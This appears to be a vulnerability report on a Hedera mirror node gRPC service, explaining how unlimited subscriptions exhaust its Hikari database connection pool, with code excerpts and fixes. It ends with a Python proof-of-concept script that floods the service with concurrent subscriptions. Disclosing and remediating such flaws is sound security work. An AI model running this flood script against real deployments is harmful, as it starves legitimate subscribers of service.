### Title
Unbounded Concurrent Subscriptions Exhaust Hikari DB Connection Pool via `@Transactional(readOnly=true)` Poll Loop

### Summary
`PollingTopicMessageRetriever.poll()` acquires a JDBC connection from the Hikari pool on every invocation via the `@Transactional(readOnly=true)` annotation on `TopicMessageRepositoryCustom.findByFilter()`. There is no global limit on concurrent gRPC subscriptions, and the `boundedElastic()` scheduler can run far more concurrent polls than the connection pool has slots. An unauthenticated attacker opening many gRPC connections can saturate the pool, causing all subsequent poll calls to block waiting for a connection and stalling message delivery to every subscriber.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `PollingTopicMessageRetriever.retrieve()` → repeated calls to `poll()`:

```
// PollingTopicMessageRetriever.java:78
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`findByFilter` is declared:

```
// TopicMessageRepositoryCustom.java:12-13
@Transactional(readOnly = true)
Stream<TopicMessage> findByFilter(TopicMessageFilter filter);
```

The implementation calls `typedQuery.getResultList().stream()` — this materialises the result set, so the transaction (and its Hikari connection) is held for the full duration of the SQL query execution on every poll cycle.

**Scheduler amplification:**

```
// PollingTopicMessageRetriever.java:41
scheduler = Schedulers.boundedElastic();
```

`Schedulers.boundedElastic()` defaults to `10 × availableProcessors` threads (e.g. 40 on a 4-core host). All subscriptions share this scheduler and fire polls at the same configured frequency (default 2 s throttled, 20 ms unthrottled). When enough subscriptions exist, all 40 scheduler threads can simultaneously be inside `findByFilter()`, each holding a Hikari connection.

**No global subscription cap:**

`TopicMessageServiceImpl` tracks `subscriberCount` only as a Micrometer gauge — it is never used to reject new subscriptions:

```
// TopicMessageServiceImpl.java:48,89-90
private final AtomicLong subscriberCount = new AtomicLong(0L);
...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

The only per-connection limit is:

```
// NettyProperties.java:14
private int maxConcurrentCallsPerConnection = 5;
```

This is trivially bypassed by opening multiple TCP connections.

**Root cause:** The combination of (a) no global subscription limit, (b) `@Transactional(readOnly=true)` acquiring a pool connection per poll, and (c) a `boundedElastic()` scheduler whose thread ceiling exceeds the Hikari pool size creates a resource exhaustion path reachable by any unauthenticated caller.

### Impact Explanation

When the Hikari pool (Spring Boot default: 10 connections) is fully occupied by concurrent polls, every subsequent `findByFilter()` call blocks in `HikariPool.getConnection()` until `connectionTimeout` (default 30 s) elapses, at which point it throws `SQLTransientConnectionException`. The `retryWhen(Retry.backoff(Long.MAX_VALUE, ...))` in `retrieve()` then retries indefinitely, keeping the subscription alive but delivering no messages. All legitimate subscribers — including those receiving live HCS gossip-delivery confirmations — experience complete message starvation for the duration of the attack. The importer's own DB writes are on a separate pool, but the gRPC read path is fully blocked.

### Likelihood Explanation

No authentication is required to call `subscribeTopic`. An attacker needs only a gRPC client and enough TCP connections to exceed `boundedElastic()` thread capacity ÷ 5 calls/connection (e.g. 8 connections on a 4-core host). The attack is repeatable, requires no special knowledge, and can be sustained indefinitely with a small script. The public gRPC port (5600) is exposed by default with no IP-level rate limiting in the application layer.

### Recommendation

1. **Enforce a global subscription limit**: compare `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Size the Hikari pool above the `boundedElastic()` ceiling**, or cap `boundedElastic` threads to a value safely below the pool size.
3. **Add per-IP / per-client rate limiting** at the gRPC interceptor layer (e.g. using Bucket4j, already present in the web3 module).
4. **Set `maximumPoolSize` explicitly** in `spring.datasource.hikari` for the gRPC module rather than relying on the Spring Boot default of 10.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 20   # 20 TCP connections × 5 calls = 100 concurrent subscriptions

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
        # no limit → subscription never ends
    )
    for _ in range(5):   # fill maxConcurrentCallsPerConnection
        threading.Thread(target=lambda: list(stub.subscribeTopic(query))).start()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# After ~seconds: all Hikari connections occupied; legitimate polls block/timeout
```

Preconditions: network access to port 5600; no credentials needed.
Trigger: run the script; observe `hikaricp_connections_pending > 0` and message delivery latency spike to infinity for all subscribers.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
